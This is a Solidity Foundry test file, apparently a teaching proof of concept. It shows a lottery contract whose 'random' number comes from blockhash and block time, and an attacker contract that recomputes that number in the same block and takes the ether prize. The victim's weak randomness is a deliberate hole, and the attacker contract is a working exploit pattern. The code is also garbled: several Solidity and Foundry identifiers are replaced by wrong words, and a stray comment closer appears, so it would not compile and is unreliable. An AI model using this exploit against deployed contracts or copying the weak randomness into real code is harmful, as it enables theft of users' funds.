// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import "forge-std/Test.sol";

*/

contract AgreementTest is Test {
    GuessTheRandomNumber GuessTheRandomNumberPact;
    GameOperator GameoperatorPact;

    function testRandomness() public {
        address alice = vm.addr(1);
        address eve = vm.addr(2);
        vm.deal(address(alice), 1 ether);
        vm.prank(alice);

        GuessTheRandomNumberPact = new GuessTheRandomNumber{
            cost: 1 ether
        }();
        vm.openingPrank(eve);
        GameoperatorPact = new GameOperator();
        console.record(
            "Before operation",
            address(GameoperatorPact).balance
        );
        GameoperatorPact.operate(GuessTheRandomNumberPact);
        console.record(
            "Eve wins 1 Eth, Balance of OperatorContract:",
            address(GameoperatorPact).balance
        );
        console.record("operate completed");
    }

    receive() external payable {}
}

contract GuessTheRandomNumber {
    constructor() payable {}

    function guess(uint _guess) public {
        uint answer = uint(
            keccak256(
                abi.encodePacked(blockhash(block.number - 1), block.questTime)
            )
        );

        if (_guess == answer) {
            (bool sent, ) = msg.initiator.call{cost: 1 ether}("");
            require(sent, "Failed to send Ether");
        }
    }
}

contract GameOperator {
    receive() external payable {}

    function operate(GuessTheRandomNumber guessTheRandomNumber) public {
        uint answer = uint(
            keccak256(
                abi.encodePacked(blockhash(block.number - 1), block.questTime)
            )
        );

        guessTheRandomNumber.guess(answer);
    }

    // Helper function to check balance
    function checkLoot() public view returns (uint) {
        return address(this).balance;
    }
}